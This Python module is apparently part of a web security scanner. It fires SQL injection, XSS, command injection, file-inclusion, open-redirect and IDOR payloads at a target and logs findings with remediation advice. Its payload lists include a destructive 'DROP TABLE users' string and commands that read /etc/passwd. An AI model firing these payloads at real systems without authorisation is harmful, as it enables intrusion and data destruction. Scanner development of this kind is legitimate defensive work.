#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Vulnerability Scanner Module

Scans for common and advanced web vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Local/Remote File Inclusion
- Command Injection
- Open Redirect
- Insecure Direct Object References
- Security Misconfigurations
"""

import asyncio
import re
from typing import Dict, Any, List, Optional, Set
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import logging

from modules.base import BaseModule
from core.state import Finding

logger = logging.getLogger(__name__)


class VulnerabilityModule(BaseModule):
    """
    Vulnerability detection module
    """
    
    MODULE_NAME = "vulnerability"
    MODULE_DESCRIPTION = "Vulnerability detection and testing"
    
    # SQL Injection payloads
    SQLI_PAYLOADS = [
        "'",
        "''",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR 1=1",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "' OR 1=1/*",
        "') OR '1'='1",
        "') OR ('1'='1",
        "1' AND 1=1 --",
        "1' AND 1=2 --",
        "1' OR '1'='1",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' AND 1=CONVERT(int, (SELECT @@version)) --",
        "'; DROP TABLE users; --",
        "1 AND (SELECT COUNT(*) FROM users) > 0",
    ]
    
    # XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<object data=javascript:alert('XSS')>",
        "<embed src=javascript:alert('XSS')>",
    ]
    
    # Command injection payloads
    RCE_PAYLOADS = [
        "; id",
        "; whoami",
        "; cat /etc/passwd",
        "| id",
        "| whoami",
        "`id`",
        "$(id)",
        "; echo 'test'",
        "&& id",
        "|| id",
        "; dir",
        "; type file.txt",
        "| dir",
    ]
    
    # LFI payloads
    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "../../../etc/passwd%00",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "../../../windows/system32/drivers/etc/hosts",
        "....//....//....//windows/system32/drivers/etc/hosts",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://input",
        "expect://id",
        "data://text/plain,<?php phpinfo(); ?>",
    ]
    
    # Open redirect payloads
    REDIRECT_PAYLOADS = [
        "https://evil.com",
        "//evil.com",
        "/\/evil.com",
        "/%09/evil.com",
        "https:evil.com",
        "//evil%00.com",
        "https://target.com.evil.com",
        "https://evil.com/target.com",
        "/\\evil.com",
        "//evil.com/%2f..",
    ]
    
    def __init__(self, config, state, http_client, ai_analyzer=None):
        super().__init__(config, state, http_client, ai_analyzer)
        self.target = config.get('target')
        self.parsed_url = urlparse(self.target)
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
        
        # Test results
        self.tested_params: Set[str] = set()
        self.vulnerable_endpoints: List[Dict] = []
    
    async def run(self) -> Dict[str, Any]:
        """
        Execute vulnerability scanning
        
        Returns:
            Vulnerability scan results
        """
        self.logger.info(f"Starting vulnerability scan for {self.base_url}")
        
        # Get discovered endpoints from state
        endpoints = self._get_endpoints_to_test()
        
        if not endpoints:
            self.logger.warning("No endpoints to test")
            return self.get_results()
        
        # Run vulnerability tests
        tasks = []
        
        # SQL Injection tests
        if self.config.get('vulnerability.test_sqli', True):
            tasks.append(self._test_sqli(endpoints))
        
        # XSS tests
        if self.config.get('vulnerability.test_xss', True):
            tasks.append(self._test_xss(endpoints))
        
        # Command injection tests
        if self.config.get('vulnerability.test_rce', True):
            tasks.append(self._test_rce(endpoints))
        
        # LFI tests
        if self.config.get('vulnerability.test_lfi', True):
            tasks.append(self._test_lfi(endpoints))
        
        # Open redirect tests
        if self.config.get('vulnerability.test_redirect', True):
            tasks.append(self._test_redirect(endpoints))
        
        # IDOR tests
        if self.config.get('vulnerability.test_idor', True):
            tasks.append(self._test_idor(endpoints))
        
        # Execute all tests
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        for result in results:
            if isinstance(result, Exception):
                self.logger.error(f"Vulnerability test failed: {result}")
            elif isinstance(result, list):
                for finding_data in result:
                    finding = Finding(**finding_data)
                    self.state.add_finding(finding)
        
        return self.get_results()
    
    def _get_endpoints_to_test(self) -> List[str]:
        """Get list of endpoints to test"""
        endpoints = []
        
        # Add base URL
        endpoints.append(self.target)
        
        # Add discovered endpoints
        for endpoint in self.state.discovered_endpoints:
            if not endpoint.startswith('http'):
                endpoint = urljoin(self.base_url, endpoint)
            endpoints.append(endpoint)
        
        # Limit based on mode
        mode = self.config.get('scan.mode')
        if mode == 'silent':
            endpoints = endpoints[:5]
        elif mode == 'standard':
            endpoints = endpoints[:20]
        
        return list(set(endpoints))
    
    async def _test_sqli(self, endpoints: List[str]) -> List[Dict]:
        """Test for SQL Injection vulnerabilities"""
        self.logger.info("Testing for SQL Injection")
        
        findings = []
        
        # Limit payloads based on mode
        mode = self.config.get('scan.mode')
        payloads = self.SQLI_PAYLOADS[:5] if mode == 'silent' else self.SQLI_PAYLOADS
        
        for endpoint in endpoints:
            # Check if endpoint has parameters
            parsed = urlparse(endpoint)
            if not parsed.query:
                continue
            
            params = parse_qs(parsed.query)
            
            for param_name in params:
                if f"{endpoint}:{param_name}" in self.tested_params:
                    continue
                
                self.tested_params.add(f"{endpoint}:{param_name}")
                
                for payload in payloads:
                    try:
                        # Test parameter
                        test_params = params.copy()
                        test_params[param_name] = payload
                        test_query = urlencode(test_params, doseq=True)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                        
                        response = await self.http_client.get(test_url)
                        content = await response.text()
                        
                        # Check for SQL error indicators
                        sql_errors = [
                            r"SQL syntax.*MySQL",
                            r"Warning.*mysql_.*",
                            r"valid MySQL result",
                            r"MySqlClient\\.",
                            r"PostgreSQL.*ERROR",
                            r"Warning.*pg_.*",
                            r"valid PostgreSQL result",
                            r"Npgsql\\.",
                            r"Driver.*SQL.*Server",
                            r"OLE DB.*SQL.*Server",
                            r"(W|w)arning.*(mssql|sqlsrv).*",
                            r"(W|w)arning.*(oci|ora)-[0-9]+",
                            r"Microsoft.*OLE DB.*Oracle",
                            r"ORA-[0-9]+",
                            r"Oracle.*Driver",
                            r"SQLite/JDBCDriver",
                            r"SQLite.Exception",
                            r"System.Data.SQLite.SQLiteException",
                            r"sqlite3.*:",
                            r"\[SQLITE_ERROR\]"
                        ]
                        
                        for error_pattern in sql_errors:
                            if re.search(error_pattern, content, re.IGNORECASE):
                                findings.append({
                                    'id': 'SQLI001',
                                    'title': 'SQL Injection Vulnerability',
                                    'description': f'Parameter "{param_name}" appears vulnerable to SQL injection',
                                    'severity': 'critical',
                                    'category': 'sqli',
                                    'url': endpoint,
                                    'evidence': [
                                        f"Parameter: {param_name}",
                                        f"Payload: {payload}",
                                        f"Error pattern matched: {error_pattern}"
                                    ],
                                    'remediation': 'Use parameterized queries or prepared statements. Validate and sanitize all user input.',
                                    'cwe_id': 'CWE-89',
                                    'cvss_score': 9.8
                                })
                                break
                        
                        # Check for time-based blind SQLi (only in deep mode)
                        if mode in ['deep', 'ai']:
                            time_payloads = [
                                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
                                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),5) --"
                            ]
                            # Time-based tests would go here
                    
                    except Exception as e:
                        self.logger.debug(f"SQLi test failed for {endpoint}: {e}")
        
        return findings
    
    async def _test_xss(self, endpoints: List[str]) -> List[Dict]:
        """Test for Cross-Site Scripting vulnerabilities"""
        self.logger.info("Testing for XSS")
        
        findings = []
        
        # Limit payloads
        mode = self.config.get('scan.mode')
        payloads = self.XSS_PAYLOADS[:5] if mode == 'silent' else self.XSS_PAYLOADS[:10]
        
        for endpoint in endpoints:
            parsed = urlparse(endpoint)
            if not parsed.query:
                continue
            
            params = parse_qs(parsed.query)
            
            for param_name in params:
                for payload in payloads:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload
                        test_query = urlencode(test_params, doseq=True)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                        
                        response = await self.http_client.get(test_url)
                        content = await response.text()
                        
                        # Check if payload is reflected
                        if payload in content:
                            # Check if properly encoded
                            import html
                            encoded_payload = html.escape(payload)
                            
                            if payload not in encoded_payload:
                                findings.append({
                                    'id': 'XSS001',
                                    'title': 'Reflected Cross-Site Scripting (XSS)',
                                    'description': f'Parameter "{param_name}" is vulnerable to reflected XSS',
                                    'severity': 'high',
                                    'category': 'xss',
                                    'url': endpoint,
                                    'evidence': [
                                        f"Parameter: {param_name}",
                                        f"Payload: {payload}",
                                        "Payload was reflected without proper encoding"
                                    ],
                                    'remediation': 'Encode all user input before displaying. Implement Content Security Policy (CSP).',
                                    'cwe_id': 'CWE-79',
                                    'cvss_score': 6.1
                                })
                                break
                    
                    except Exception as e:
                        self.logger.debug(f"XSS test failed for {endpoint}: {e}")
        
        return findings
    
    async def _test_rce(self, endpoints: List[str]) -> List[Dict]:
        """Test for Remote Code Execution vulnerabilities"""
        self.logger.info("Testing for RCE")
        
        findings = []
        
        # Skip in silent mode
        mode = self.config.get('scan.mode')
        if mode == 'silent':
            return findings
        
        payloads = self.RCE_PAYLOADS[:5] if mode == 'standard' else self.RCE_PAYLOADS
        
        for endpoint in endpoints:
            parsed = urlparse(endpoint)
            if not parsed.query:
                continue
            
            params = parse_qs(parsed.query)
            
            for param_name in params:
                for payload in payloads:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload
                        test_query = urlencode(test_params, doseq=True)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                        
                        response = await self.http_client.get(test_url)
                        content = await response.text()
                        
                        # Check for command output indicators
                        rce_indicators = [
                            r"uid=\d+\(\w+\)",
                            r"root:.*:0:0:",
                            r"[a-z]+:\d+:\d+:[^:]*:[^:]*:[^:]*",
                            r"Windows IP Configuration",
                            r"Volume Serial Number"
                        ]
                        
                        for indicator in rce_indicators:
                            if re.search(indicator, content):
                                findings.append({
                                    'id': 'RCE001',
                                    'title': 'Remote Code Execution Vulnerability',
                                    'description': f'Parameter "{param_name}" allows command execution',
                                    'severity': 'critical',
                                    'category': 'rce',
                                    'url': endpoint,
                                    'evidence': [
                                        f"Parameter: {param_name}",
                                        f"Payload: {payload}",
                                        f"Command output detected: {indicator}"
                                    ],
                                    'remediation': 'Never pass user input directly to system commands. Use allowlists and input validation.',
                                    'cwe_id': 'CWE-78',
                                    'cvss_score': 10.0
                                })
                                break
                    
                    except Exception as e:
                        self.logger.debug(f"RCE test failed for {endpoint}: {e}")
        
        return findings
    
    async def _test_lfi(self, endpoints: List[str]) -> List[Dict]:
        """Test for Local File Inclusion vulnerabilities"""
        self.logger.info("Testing for LFI")
        
        findings = []
        
        mode = self.config.get('scan.mode')
        if mode == 'silent':
            return findings
        
        payloads = self.LFI_PAYLOADS[:5] if mode == 'standard' else self.LFI_PAYLOADS
        
        for endpoint in endpoints:
            parsed = urlparse(endpoint)
            if not parsed.query:
                continue
            
            params = parse_qs(parsed.query)
            
            # Look for file-related parameters
            file_params = [p for p in params if any(
                kw in p.lower() for kw in ['file', 'path', 'include', 'page', 'view', 'load']
            )]
            
            for param_name in file_params:
                for payload in payloads:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload
                        test_query = urlencode(test_params, doseq=True)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                        
                        response = await self.http_client.get(test_url)
                        content = await response.text()
                        
                        # Check for file content indicators
                        lfi_indicators = [
                            r"root:.*:0:0:",
                            r"bin:.*:1:1:",
                            r"daemon:.*:2:2:",
                            r"# Copyright \(c\) 1993-",
                            r"127\.0\.0\.1\s+localhost",
                            r"<?php",
                            r"\[boot loader\]"
                        ]
                        
                        for indicator in lfi_indicators:
                            if re.search(indicator, content):
                                findings.append({
                                    'id': 'LFI001',
                                    'title': 'Local File Inclusion Vulnerability',
                                    'description': f'Parameter "{param_name}" allows file inclusion',
                                    'severity': 'high',
                                    'category': 'lfi',
                                    'url': endpoint,
                                    'evidence': [
                                        f"Parameter: {param_name}",
                                        f"Payload: {payload}",
                                        f"File content detected: {indicator}"
                                    ],
                                    'remediation': 'Use allowlists for file inclusion. Never include files based on user input.',
                                    'cwe_id': 'CWE-22',
                                    'cvss_score': 7.5
                                })
                                break
                    
                    except Exception as e:
                        self.logger.debug(f"LFI test failed for {endpoint}: {e}")
        
        return findings
    
    async def _test_redirect(self, endpoints: List[str]) -> List[Dict]:
        """Test for Open Redirect vulnerabilities"""
        self.logger.info("Testing for Open Redirect")
        
        findings = []
        
        mode = self.config.get('scan.mode')
        payloads = self.REDIRECT_PAYLOADS[:3] if mode == 'silent' else self.REDIRECT_PAYLOADS[:6]
        
        for endpoint in endpoints:
            parsed = urlparse(endpoint)
            if not parsed.query:
                continue
            
            params = parse_qs(parsed.query)
            
            # Look for redirect-related parameters
            redirect_params = [p for p in params if any(
                kw in p.lower() for kw in ['redirect', 'url', 'next', 'return', 'goto', 'link', 'target']
            )]
            
            for param_name in redirect_params:
                for payload in payloads:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload
                        test_query = urlencode(test_params, doseq=True)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                        
                        response = await self.http_client.get(
                            test_url,
                            allow_redirects=False
                        )
                        
                        # Check for redirect
                        if response.status in [301, 302, 303, 307, 308]:
                            location = response.headers.get('Location', '')
                            if 'evil.com' in location or payload in location:
                                findings.append({
                                    'id': 'RED001',
                                    'title': 'Open Redirect Vulnerability',
                                    'description': f'Parameter "{param_name}" allows arbitrary redirects',
                                    'severity': 'medium',
                                    'category': 'open_redirect',
                                    'url': endpoint,
                                    'evidence': [
                                        f"Parameter: {param_name}",
                                        f"Payload: {payload}",
                                        f"Redirect to: {location}"
                                    ],
                                    'remediation': 'Validate redirect URLs against allowlist. Use relative URLs only.',
                                    'cwe_id': 'CWE-601',
                                    'cvss_score': 6.1
                                })
                                break
                    
                    except Exception as e:
                        self.logger.debug(f"Redirect test failed for {endpoint}: {e}")
        
        return findings
    
    async def _test_idor(self, endpoints: List[str]) -> List[Dict]:
        """Test for Insecure Direct Object Reference vulnerabilities"""
        self.logger.info("Testing for IDOR")
        
        findings = []
        
        # Skip in silent mode
        mode = self.config.get('scan.mode')
        if mode == 'silent':
            return findings
        
        # Look for ID-like parameters
        for endpoint in endpoints:
            parsed = urlparse(endpoint)
            if not parsed.query:
                continue
            
            params = parse_qs(parsed.query)
            
            id_params = [p for p in params if any(
                kw in p.lower() for kw in ['id', 'user', 'account', 'doc', 'file', 'order', 'invoice']
            )]
            
            for param_name in id_params:
                try:
                    original_value = params[param_name][0]
                    
                    # Try to access different IDs
                    test_values = ['1', '2', '3', '999', '1000']
                    
                    for test_value in test_values:
                        if test_value == original_value:
                            continue
                        
                        test_params = params.copy()
                        test_params[param_name] = test_value
                        test_query = urlencode(test_params, doseq=True)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                        
                        response = await self.http_client.get(test_url)
                        
                        # If we get successful response with different data, might be IDOR
                        if response.status == 200:
                            content = await response.text()
                            
                            # Check if content is different (indicating different object accessed)
                            original_response = await self.http_client.get(endpoint)
                            original_content = await original_response.text()
                            
                            if len(content) != len(original_content):
                                findings.append({
                                    'id': 'IDOR001',
                                    'title': 'Potential IDOR Vulnerability',
                                    'description': f'Parameter "{param_name}" may allow accessing other users\' data',
                                    'severity': 'high',
                                    'category': 'idor',
                                    'url': endpoint,
                                    'evidence': [
                                        f"Parameter: {param_name}",
                                        f"Original value: {original_value}",
                                        f"Test value: {test_value}",
                                        f"Response size changed: {len(original_content)} -> {len(content)}"
                                    ],
                                    'remediation': 'Implement proper access controls. Validate user permissions for each object access.',
                                    'cwe_id': 'CWE-639',
                                    'cvss_score': 5.3
                                })
                                break
                
                except Exception as e:
                    self.logger.debug(f"IDOR test failed for {endpoint}: {e}")
        
        return findings
